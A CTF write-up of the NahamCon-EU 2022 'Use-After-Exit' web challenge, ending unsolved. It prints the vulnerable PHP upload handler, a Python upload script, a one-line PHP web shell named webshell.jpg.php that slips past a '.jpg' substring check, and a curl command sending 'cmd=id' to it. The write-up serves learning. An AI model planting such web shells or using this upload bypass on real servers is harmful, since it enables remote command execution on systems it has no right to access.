---
title: "Use-After-Exit - NahamCon-EU-CTF 2022"
category: "web"
subcategory: "ssrf"
type: "writeup"
tags: ["web", "ssrf", "path-traversal", "race-condition", "jpeg", "web-exploitation"]
difficulty: "medium"
summary: "It's as easy as it looks, isn't it?"
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/NahamCon-EU-CTF-2022/Web/Use-After-Exit/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/NahamCon-EU-CTF-2022/Web/Use-After-Exit/README.md"
ctf:
  name: "NahamCon-EU-CTF"
  year: 2022
  challenge: "Use-After-Exit"
---

## Source

- **CTF:** NahamCon-EU-CTF 2022
- **Challenge:** Use-After-Exit
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/NahamCon-EU-CTF-2022/Web/Use-After-Exit/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/NahamCon-EU-CTF-2022/Web/Use-After-Exit/README.md>

---
# Use After Exit

## Overview

- Overall difficulty for me (From 1-10 stars): ★★★★★★★★★★

- Challenge difficulty: Medium

## Background

Author: @carlopolop#3938  

**It's as easy as it looks, isn't it?**  
  
**Press the `Start` button on the top-right to begin this challenge.**  

**Connect with:**  

- [http://challenge.nahamcon.com:30714](http://challenge.nahamcon.com:30714)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221216233446.png)

## Find The Flag

**Home page:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221216233505.png)

**Hmm... Let's break down that PHP code:**
```php
<?php
error_reporting(0);
if (isset($_POST['submit'])) {
    $file_name = urldecode($_FILES['file']['name']);
    $tmp_path = $_FILES['file']['tmp_name'];
    if(strpos($file_name, ".jpg") == false){
        echo "Invalid file name";
        exit(1);
    }
    $content = file_get_contents($tmp_path);
    $all_content = '<?php exit(0);'. $content . '?>';
    $handle = fopen($file_name, "w");
    fwrite($handle, $all_content);
    fclose($handle);
    echo "Done.";
}
else{
    show_source(__FILE__);
}
?> 
```

- `error_reporting(0);`, means turn off all error reporting
- If POST request parameter `submit` is set, do:
	- `file_name` =  URL decode the file name
	- `tmp_path` = The full path of temporary file of the uploaded file
	- **If the `file_name` does NOT contain `.jpg`, then echos out `Invalid file name` and exit with an error code**
	- `content` = The content of the uploaded file
	- **`all_content` = Add `<?php exit(0);` + `content` + `?>`**
	- `handle` = Open `file_name` in `write` mode
	- **Then write `all_content` in the `handle`, close the file handler, and echos out `Done.`**
- If POST parameter `submit` is NOT set,
	- Show the source code of the current PHP file

**Armed with above information, we can try to upload a file `submit` via a python script:**
```py
#!/usr/bin/python3

import requests

url = 'http://challenge.nahamcon.com:30714/'

data = {
	'submit': 'submit'
}

file = {
	'file': open('./FILE_HERE', 'rb')
}

print(requests.post(url, data=data, files=file).text)
```

**Let's try to upload a normal image jpg file:**
```py
file = {
	'file': open('./test.jpg', 'rb')
}
```

```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Use-After-Exit]
└─# python3 exploit.py
Done.
```

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221217002243.png)

**However, we can't view that image, as the PHP code adds the `exit(0);` in the uploaded file, thus the image is broken:**
```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Use-After-Exit]
└─# wget http://challenge.nahamcon.com:30714/test.jpg

┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Use-After-Exit]
└─# head -n 1 test.jpg.1
<?php exit(0);����JFIF��C
```

**We can try to upload a PHP web shell with `.jpg.php` extension:**
```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Use-After-Exit]
└─# echo '<?php system($_GET["cmd"]); ?>' > webshell.jpg.php
```

This can bypass the `.jpg` whitelist, as it only checks the file name **contains** `.jpg` or not.

```py
file = {
	'file': open('./webshell.jpg.php', 'rb')
}
```

```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Use-After-Exit]
└─# python3 exploit.py
Done.
```

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221217005320.png)

Ah! The PHP code is adding `<?php exit(0);` and `?>` to our file.

**Let's update our web shell again:**
```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Use-After-Exit]
└─# echo 'system($_GET["cmd"]);' > webshell.jpg.php
```

```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Use-After-Exit]
└─# python3 exploit.py                                       
Done.
```

```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Web/Use-After-Exit]
└─# curl http://challenge.nahamcon.com:31792/webshell.jpg.php --get --data-urlencode "cmd=id"
                                                                                        
```

**However, we didn't have any output, as the `exit(0);` is getting executed first, which causes the web shell do nothing!**

> Note: `exit()` is a function that stops execution for the entire script.

How do we bypass that...

Race condition?

Multiple PHP opening & closing tags, like this?

```php
<?php exit(0);
?><?php echo 'test';
?>
```

Override the `index.php` file via `fopen()` write mode?

Maybe I need to do path traversal?

Or maybe SSRF(Server-Side Request Forgery) via file name, and then read local files or access local services?

Also, this PHP code is weird to me, why it's doing URL decode?

```php
$file_name = urldecode($_FILES['file']['name']);
```

After digging deeper in those rabbit holes, still no dice...
